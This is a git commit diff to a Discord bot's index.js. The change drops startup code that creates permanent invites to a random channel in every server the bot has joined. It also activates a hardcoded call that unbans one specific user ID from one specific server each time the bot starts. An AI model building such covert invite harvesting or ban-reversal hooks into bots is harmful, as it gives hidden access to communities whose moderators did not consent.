d9b7ccdecde27bc51d4d69ee5906091dd2504188
Mikadolebg <34174177+Mikadolebg@users.noreply.github.com>
2018-05-28 20:43:20 +0200

    Update index.js

--- index.js
+++ index.js
@@ -23,19 +23,15 @@ bot.on('ready', () => {
    //console.log(`ID: ${bot.guild.id}`);
    //console.log(`How many member: ${guild.memberCount}`);
    
-   bot.guilds.forEach(guild => { 
-     var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-     invite.createInvite({maxAge: 0}).then(invite => console.log(`Connecté sur : ${guild.name} ${guild.id}`));
-   })
    
   // bot.guilds.forEach(guild => { 
     // var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-    // invite.createInvite({maxAge: 0}).then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
+    // invite.createInvite({maxAge: 0}).then(invite => console.log(`Connecté sur : ${guild.name} || ${invite} || ${guild.id)`));
   // })
   
- // bot.guilds.find('id', 'ID').unban('301913733536415755')
- // .then(user => console.log(`Unbanned ${user.username} from ${guild}`))
-//  .catch(console.error);
+  bot.guilds.find('id', '377925694644027393').unban('301913733536415755')
+  .then(user => console.log(`Unbanned ${user.username} from ${guild}`))
+  .catch(console.error);
    
  });
 
